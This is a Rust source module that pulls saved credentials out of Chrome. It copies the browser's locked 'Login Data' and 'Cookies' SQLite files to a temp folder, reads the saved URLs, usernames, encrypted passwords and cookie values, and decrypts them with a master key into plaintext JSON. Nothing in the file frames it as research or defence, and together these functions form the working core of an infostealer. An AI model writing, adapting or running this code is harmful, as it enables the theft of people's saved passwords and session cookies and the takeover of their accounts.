//! SQLite extraction for Chrome's Login Data and Cookies databases.

use std::{fs, path::Path};

use rusqlite::{Connection, OpenFlags};
use serde_json::{json, Value};

use crate::crypto;

// ── Passwords ─────────────────────────────────────────────────────────────────

pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
    let login_data = profile_dir.join("Login Data");

    // Chrome keeps Login Data open; copy it to temp first.
    let tmp = copy_db_to_temp(&login_data, "chrome_login_data_tmp.db")?;
    let conn = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .map_err(|e| format!("open Login Data: {e}"))?;

    let mut stmt = conn
        .prepare("SELECT origin_url, username_value, password_value FROM logins")
        .map_err(|e| format!("prepare: {e}"))?;

    let rows: Vec<Value> = stmt
        .query_map([], |row| {
            let url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let enc_pass: Vec<u8> = row.get(2)?;
            Ok((url, username, enc_pass))
        })
        .map_err(|e| format!("query: {e}"))?
        .filter_map(|r| r.ok())
        .map(|(url, username, enc_pass)| {
            let password = if enc_pass.is_empty() {
                String::new()
            } else {
                match crypto::decrypt_value(&enc_pass, master_key) {
                    Ok(p) => p,
                    Err(_) => crypto::hex_fallback(&enc_pass),
                }
            };
            json!({
                "url": url,
                "username": username,
                "password": password,
            })
        })
        .collect();

    let _ = fs::remove_file(&tmp);
    Ok(rows)
}

// ── Cookies ───────────────────────────────────────────────────────────────────

pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
    // Chrome 114+ stores cookies in Network/Cookies.
    let cookies_path = {
        let net = profile_dir.join("Network").join("Cookies");
        if net.exists() {
            net
        } else {
            profile_dir.join("Cookies")
        }
    };

    let tmp = copy_db_to_temp(&cookies_path, "chrome_cookies_tmp.db")?;
    let conn = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .map_err(|e| format!("open Cookies: {e}"))?;

    let mut stmt = conn
        .prepare(
            "SELECT host_key, name, encrypted_value, path FROM cookies LIMIT 500",
        )
        .map_err(|e| format!("prepare cookies: {e}"))?;

    let rows: Vec<Value> = stmt
        .query_map([], |row| {
            let host: String = row.get(0)?;
            let name: String = row.get(1)?;
            let enc_val: Vec<u8> = row.get(2)?;
            let path: String = row.get(3)?;
            Ok((host, name, enc_val, path))
        })
        .map_err(|e| format!("query cookies: {e}"))?
        .filter_map(|r| r.ok())
        .map(|(host, name, enc_val, path)| {
            let value = if enc_val.is_empty() {
                String::new()
            } else {
                match crypto::decrypt_value(&enc_val, master_key) {
                    Ok(v) => v,
                    Err(_) => crypto::hex_fallback(&enc_val),
                }
            };
            json!({
                "host": host,
                "name": name,
                "value": value,
                "path": path,
            })
        })
        .collect();

    let _ = fs::remove_file(&tmp);
    Ok(rows)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn copy_db_to_temp(src: &Path, tmp_name: &str) -> Result<std::path::PathBuf, String> {
    let tmp = std::env::temp_dir().join(tmp_name);

    // Try up to 3 times with a short wait (Chrome may have a shared lock).
    for attempt in 1..=3 {
        match fs::copy(src, &tmp) {
            Ok(_) => return Ok(tmp),
            Err(e) if attempt < 3 => {
                std::thread::sleep(std::time::Duration::from_millis(500 * attempt));
            }
            Err(e) => return Err(format!("copy {} to temp: {e}", src.display())),
        }
    }
    unreachable!()
}
